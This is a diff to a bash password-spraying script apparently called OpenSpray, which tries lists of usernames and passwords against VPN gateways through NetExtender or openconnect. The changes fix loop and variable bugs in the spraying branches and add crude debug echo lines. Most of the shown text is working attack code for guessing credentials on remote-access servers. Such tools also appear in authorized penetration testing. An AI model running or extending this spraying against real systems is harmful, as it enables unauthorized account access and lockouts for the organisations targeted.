@@ -8,6 +8,7 @@ display_usage() {
 	echo -e " tar xvzf  NetExtender.Linux-10.2.816.x86_64.tgz"
 	echo -e " apt-get update"
 	echo -e " apt-get install default-jre"
+	echo -e " apt-get install ppp"
 	echo -e " cd netExtenderClient"
 	echo -e " ./install"
 	echo -e " Set pppd to run as root [y/n]? y"
@@ -73,7 +74,9 @@ GREEN='\033[0;32m'
 echo -e "${RED}###################${NC}"
 echo -e "${RED}Starting OpenSpray!${NC}"
 echo -e "${RED}###################${NC}"
-
+echo "poop"
+echo $server
+echo "crap"
 if [ "$passAsUser" == "true" ];
 then
 	echo -e "${BLUE}Spraying username as password${NC}"
@@ -84,8 +87,7 @@ then
 			
 		if [ "$protocol" == "ne" ];
 		then
-			yes Y | netExtender -u $i -p $i -d $d $server
-			done
+			yes Y | netExtender -u $i -p $i -d $domain $server
 		else
 			echo $i | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
 		fi
@@ -107,8 +109,7 @@ else
 
 				if [ "$protocol" == "ne" ];
 				then
-					yes Y | netExtender -u $i -p $j -d $d $server
-					done
+					yes Y | netExtender -u $i -p $j -d $domain $server
 				else
 					echo $j | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
 				fi
@@ -129,8 +130,7 @@ else
 			
 			if [ "$protocol" == "ne" ];
 			then
-				yes Y | netExtender -u $i -p $password -d $d $server
-				done
+				yes Y | netExtender -u $i -p $password -d $domain $server
 			else
 				echo $password | sudo openconnect $server --user=$i --passwd-on-stdin --protocol=$protocol --authenticate --servercert $cert
 			fi
